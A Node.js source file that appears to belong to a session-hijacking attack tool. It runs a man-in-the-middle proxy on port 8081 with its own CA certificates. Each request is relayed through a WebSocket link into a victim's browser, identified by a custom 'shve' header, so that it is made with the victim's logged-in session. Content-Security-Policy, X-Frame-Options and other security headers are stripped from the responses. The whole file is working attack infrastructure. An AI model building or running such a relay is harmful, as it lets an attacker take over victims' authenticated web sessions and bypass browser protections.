const HttpMitmProxy = require('http-mitm-proxy');
const { startServer: startVictimServer, sendWebSocketRequest } = require('./victimServer');

blockedHeaders = [
  'x-content-type-option',
  'content-security-policy',
  'x-frame-options',
  'x-xss-protection',
  'content-encoding',
]

function filterHeaders(headers) {
  const filteredHeaders = {};
  for (const key in headers) {
    if (!blockedHeaders.includes(key.toLowerCase())) {
      filteredHeaders[key] = headers[key];
    }
  }
  return filteredHeaders;
}

function startProxyServer() {
  const proxy = new HttpMitmProxy.Proxy();

  proxy.onRequest(async (ctx, callback) => {
    const protocol = ctx.isSSL ? 'https://' : 'http://';
    const host = ctx.clientToProxyRequest.headers.host;
    const port = ctx.proxyToServerRequestOptions.port;
    const url = ctx.clientToProxyRequest.url;
  
    const fullUrl = `${protocol}${host}:${port}${url}`;
  
    console.log(`[${new Date().toISOString()}] ${ctx.clientToProxyRequest.method} ${fullUrl}`);
  
    
    const wsId = ctx.clientToProxyRequest.headers.shve;
    const headers = ctx.clientToProxyRequest.headers;
  
    const response = await sendWebSocketRequest(wsId, ctx.clientToProxyRequest.method, fullUrl, headers, ctx.clientToProxyRequest.postData);
    
    if (response.error) {
      ctx.proxyToClientResponse.writeHead(200, { 'Content-Type': 'text/plain' });
      ctx.proxyToClientResponse.end(response.error);
    } else {
      const filteredHeaders = filterHeaders(response.headers);
      ctx.proxyToClientResponse.writeHead(response.status_code, filteredHeaders);
      ctx.proxyToClientResponse.end(response.data);
    }
    return callback();
  });

  proxy.listen({ host: '0.0.0.0', port: 8081, sslCaDir: './certs' }, () => {
    console.log('Proxy listening on port: 8081');
  });
}

module.exports = startProxyServer;